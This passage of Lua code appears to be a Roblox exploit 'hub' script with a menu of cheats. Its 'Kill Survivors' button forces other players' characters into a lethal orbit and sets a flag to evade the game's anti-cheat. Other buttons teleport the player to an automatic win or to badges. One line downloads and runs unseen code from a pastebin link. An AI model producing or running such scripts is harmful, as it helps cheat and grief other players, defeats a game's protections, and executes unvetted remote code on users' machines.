end

end

-- ======================
-- MAIN CONTROL LOOP
-- ======================

task.spawn(function()
while true do
local s = Teams:FindFirstChild("Survivors")
local b = Teams:FindFirstChild("Bear")

local hasSurvivors = s and #s:GetPlayers() > 0  
    local hasBear = b and #b:GetPlayers() > 0  

    if hasSurvivors or hasBear then  
        stopLobbyMusic()  
    else  
        if not getgenv().LobbySound then  
            playLobbyMusic()  
        end  
    end  

    task.wait(1)  
end

end)

loadstring(game:HttpGet("https://pastebin.com/raw/9AQrDua1"))()

local CoreGui = game:GetService("CoreGui")
local TopBarApp = CoreGui:FindFirstChild("TopBarApp")
local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerGui = player:FindFirstChild("PlayerGui")
local OldRobloxGui = PlayerGui:FindFirstChild("RobloxGui")
local TopBarContainer = OldRobloxGui:FindFirstChild("TopBarContainer")
local Chat = TopBarContainer:FindFirstChild("Chat")

if Chat then
Chat.Position = UDim2.new(0, 50, 0, 0)
end

local BackPack = TopBarContainer:FindFirstChild("Backpack")
if BackPack then
BackPack.Position = UDim2.new(0, 100, 0, 0)
end

local Settings = TopBarContainer:FindFirstChild("Settings")
if Settings then
Settings.Position = UDim2.new(0, 0, 0, 0)
end

if TopBarApp then
TopBarApp.Enabled = false
end

if RobloxGui then
RobloxGui:Destroy()
end
print("Bear [Alpha] Hub!: Nostalgia Activated✔")
    end,
})


local Tab = Window:CreateTab("Bear", "paw-print")

local Button = Tab:CreateButton({
    Name = "Kill Survivors",
    Callback = function()
-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer

-- Team checks
local function isBear()
    if plr.Team and plr.Team.Name == "Bear" then return true end
    if plr:FindFirstChild("Role") and plr.Role.Value == "Bear" then return true end
    return false
end

local function isSurvivors(target)
    if target.Team and target.Team.Name == "Survivors" then return true end
    if target:FindFirstChild("Role") and target.Role.Value == "Survivors" then return true end
    return false
end

-- Settings
local ORBIT_SPEED = 99e9
local ORBIT_DISTANCE = 2

-- Orbiting state
local orbiting = {}
local activeCount = 0
local finished = false

-- Self-destruct (temporary bypass AC)
local function trySelfDestruct()
    if finished then return end
    if activeCount <= 0 then
        finished = true
        task.delay(0.2, function()
            local char = plr.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum then
                -- Allow AC script to ignore this
                getgenv().isKillAllSurv = true
                hum.Health = 0
                hum:ChangeState(Enum.HumanoidStateType.Dead)
                task.delay(0.15, function()
                    getgenv().isKillAllSurv = false
                end)
            end
        end)
    end
end

-- Orbit a single target
local function startOrbit(target)
    if orbiting[target] then return end
    orbiting[target] = true
    activeCount += 1

    task.spawn(function()
        local angle = 0
        while orbiting[target] do
            if not isBear() then break end

            local char = plr.Character
            local tChar = target.Character
            if not char or not tChar then break end

            local hrp = char:FindFirstChild("HumanoidRootPart")
            local tHrp = tChar:FindFirstChild("HumanoidRootPart")
            local tHum = tChar:FindFirstChildOfClass("Humanoid")

            if not hrp or not tHrp or not tHum or tHum.Health <= 0 then break end

            angle += (ORBIT_SPEED / ORBIT_DISTANCE) * RunService.Heartbeat:Wait()

            local offset = Vector3.new(
                math.cos(angle) * ORBIT_DISTANCE,
                0,
                math.sin(angle) * ORBIT_DISTANCE
            )

            tHrp.CFrame = hrp.CFrame * CFrame.new(offset)
        end

        orbiting[target] = nil
        activeCount -= 1
        trySelfDestruct()
    end)
end

-- Custom function to orbit all survivors
function KillAllSurvivors()
    if not isBear() then return end
    finished = false
    activeCount = 0
    orbiting = {}

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= plr and isSurvivors(player) then
            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                startOrbit(player)
            end
        end
    end
end 
KillAllSurvivors()
print("Bear [Alpha] Hub!: Kill Survivors Executed✔")
end,
})

local Tab = Window:CreateTab("Survivors", "person-standing")

local Button = Tab:CreateButton({
    Name = "Auto Win (useful for farming)",
    Callback = function()
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local baseplateName = "AutoWinplate"

-- Check if the baseplate already exists
local existingPlate = Workspace:FindFirstChild(baseplateName)

if not existingPlate then
    -- Create the main baseplate
    local baseplate = Instance.new("Part")
    baseplate.Name = baseplateName
    baseplate.Size = Vector3.new(6767, 455, 6969) -- Massive plate
    baseplate.Anchored = true
    baseplate.CanCollide = true
    baseplate.TopSurface = Enum.SurfaceType.Smooth
    baseplate.BottomSurface = Enum.SurfaceType.Smooth
    baseplate.BrickColor = BrickColor.new("Bright yellow")
    baseplate.Transparency = 0.2
    baseplate.Material = Enum.Material.Neon

    -- Place it far away from player
    local offset = Vector3.new(696969, 0, 0)
    baseplate.Position = hrp.Position + offset + Vector3.new(0, baseplate.Size.Y/2, 0)

    baseplate.Parent = Workspace
    existingPlate = baseplate

    -- Create invisible support underneath for stability
    local support = Instance.new("Part")
    support.Name = baseplateName .. "_Support"
    support.Size = Vector3.new(6767, 1, 6969)
    support.Anchored = true
    support.CanCollide = false
    support.Transparency = 1
    support.Position = Vector3.new(
        baseplate.Position.X,
        baseplate.Position.Y - baseplate.Size.Y/2 - 0.5,
        baseplate.Position.Z
    )
    support.Parent = baseplate

    -- Optional: subtle point light for extra glow
    local light = Instance.new("PointLight")
    light.Range = 1000
    light.Brightness = 5
    light.Color = Color3.fromRGB(255, 255, 100)
    light.Parent = baseplate
end

-- Teleport player to center and on top of the baseplate
hrp.CFrame = CFrame.new(
    existingPlate.Position.X,
    existingPlate.Position.Y + existingPlate.Size.Y/2 + 7,
    existingPlate.Position.Z
)
print("Bear [Alpha] Hub!: Auto Win Executed✔")
end,
})

local Tab = Window:CreateTab("Get Badges", "award")

local Button = Tab:CreateButton({
Name = "HELPING HAND Badge",
Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- Define the target location
local targetPart = workspace:WaitForChild("Lobby")
    :WaitForChild("Map")
    :WaitForChild("Important")
    :WaitForChild("AstrobearQuest")
    :WaitForChild("PASSBadge")

-- Perform the teleportation
-- We set the CFrame slightly above the target to prevent getting stuck
humanoidRootPart.CFrame = targetPart.CFrame + Vector3.new(0, 3, 0)
end,
})

local Button = Tab:CreateButton({
Name = "Looking for closure. Badge",
Callback = function()
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- Configuration
local WAIT_AND_TP = 1

-- Function to handle teleportation
local function teleportTo(part)
	if part and part:IsA("BasePart") then
		humanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 3, 0)
		task.wait(WAIT_AND_TP)
	end
end

-- Function to handle clicking
local function clickButton(buttonPart)
	if buttonPart and buttonPart:IsA("BasePart") then
		-- Teleport to button first
		teleportTo(buttonPart)
		
		-- Use VirtualUser to click
		VirtualUser:CaptureController()
		VirtualUser:ClickButton1(Vector2.new(0,0))
	end
end

-- Map references
local map = Workspace:WaitForChild("Map")
local key1 = map:WaitForChild("Key1"):WaitForChild("Handle")
local door1 = map:WaitForChild("Locked_1"):WaitForChild("Door")
local key2 = map:WaitForChild("Key2"):WaitForChild("Handle")
local door2 = map:WaitForChild("Locked_2"):WaitForChild("Door")
local button = map:WaitForChild("Button")
local badgey = map:WaitForChild("Badgey")

-- Execution Sequence
teleportTo(key1)
teleportTo(door1)
teleportTo(key2)
teleportTo(door2)
clickButton(button)
teleportTo(badgey) 
end,
})

local Tab = Window:CreateTab("Custom Songs", "music")

local Section = Tab:CreateSection("Custom Music Loader")

local Label = Tab:CreateLabel("How to use: Go inside your exploit workspace folder and create a folder named 'Music' (Exactly like that or it wont work). Put your music files here.", "activity")

local Label = Tab:CreateLabel("Do not forget to put the full music file name with extension! Example: song.mp3", "file")

local Button = Tab:CreateButton({
Name = "Remove Ambient Reverb",
Callback = function()
local SoundService = game:GetService("SoundService")
SoundService.AmbientReverb = Enum.ReverbType.NoReverb
print("Bear [Alpha] Hub!: Ambient Reverb Removed✔")
end,
})

local Button = Tab:CreateButton({
Name = "Add Default Ambient Reverb",
Callback = function()
local SoundService = game:GetService("SoundService")
SoundService.AmbientReverb = Enum.ReverbType.Hangar
print("Bear [Alpha] Hub!: Ambient Reverb Added✔")
end,
})

local Button = Tab:CreateButton({
Name = "Mute Game Music [Temporary]",
Callback = function()
local M = workspace.Music
M.SoundId = "rbxassetid://"
M.PlaybackSpeed = 1
M.TimePosition = 0
M.Playing = true
M.Looped = true
Rayfield:Notify({
Title = "Bear [Alpha] Hub!",
Content = "Music Muted✔",
Duration = 2,
Image = "volume-off",
})
end,
})

local Slider = Tab:CreateSlider({
Name = "Music Volume",
Range = {0, 2},
Increment = 0.1,
Suffix = "Volume",
CurrentValue = 1,
Flag = "SliderVolume",
Callback = function(v)
local M = workspace.Music
M.Volume = v
end,
})

local Input = Tab:CreateInput({
Name = "Enter Song File Name",
PlaceholderText = "song.mp3/wav/ogg",
RemoveTextAfterFocus = false,
Callback = function(text)
    local sound = workspace:FindFirstChild("Music") -- re-fetch here
    if not sound then
        warn("Music object not found in Workspace!")
        return
    end

    local musicFolderPath = "Music"
    if not isfolder(musicFolderPath) then
        warn("Folder not found: " .. musicFolderPath)
        return
    end

    local filePath = musicFolderPath .. "/" .. text
    if isfile(filePath) then
        sound.SoundId = getcustomasset(filePath)
        sound.Volume = 1
        sound.TimePosition = 0
        sound:Play()
        print("Playing: " .. filePath)
        Rayfield:Notify({
            Title = "Bear [Alpha] Hub!",
            Content = "Custom Music Loaded✔",
            Duration = 2,
            Image = "music",
        })
    else
        warn("File not found: " .. filePath)
    end
end
})

local Section = Tab:CreateSection("Sound Effects (SFX) Settings")

local Input = Tab:CreateInput({
Name = "Playback Speed (Input)",
CurrentValue = "",
PlaceholderText = "1",
RemoveTextAfterFocusLost = false,
Flag = "InputPlaybackSpeed",
Callback = function(Text)
local M = workspace.Music
M.PlaybackSpeed = Text
end,
})

local Slider = Tab:CreateSlider({
Name = "Playback Speed (Slider)",
Range = {0, 12},
Increment = 0.01,
Suffix = "Amount",
CurrentValue = 1,
Flag = "SliderPlaybackSpeed",
Callback = function(v)
local M = workspace.Music
M.PlaybackSpeed = v
end,
})

local Divider = Tab:CreateDivider()

local Section = Tab:CreateSection("Visualizers")

local Button = Tab:CreateButton({
Name = "Activate FOV Music Visualizer",
Callback = function()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local sound = workspace:WaitForChild("Music")
local BASE_FOV = 85
local MAX_EXTRA_FOV = 120
local TWEEN_TIME = 0.1
local SCALING_FACTOR = 35
local function getBassValue()
local spectrumData
local success = pcall(function() spectrumData = sound:GetSpectrumData() end)
if not success or not spectrumData or #spectrumData == 0 then
return sound.PlaybackLoudness
end
local bassCount = math.max(1, math.floor(#spectrumData * 0.2))
local bassSum = 0
for i = 1, bassCount do
bassSum = bassSum + spectrumData[i]
end
local averageBass = bassSum / bassCount
return averageBass
end
local function updateCameraFOV()
local bassValue = getBassValue()
local additionalFOV = math.clamp(bassValue / SCALING_FACTOR, 0, MAX_EXTRA_FOV)
local targetFOV = BASE_FOV + additionalFOV
local tween = TweenService:Create(
camera,
TweenInfo.new(TWEEN_TIME, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
{FieldOfView = targetFOV}
)
tween:Play()
end
RunService.RenderStepped:Connect(function()
updateCameraFOV()
end)
print("Bear [Alpha] Hub!: FOV Visualizer Activated✔")
end,
})
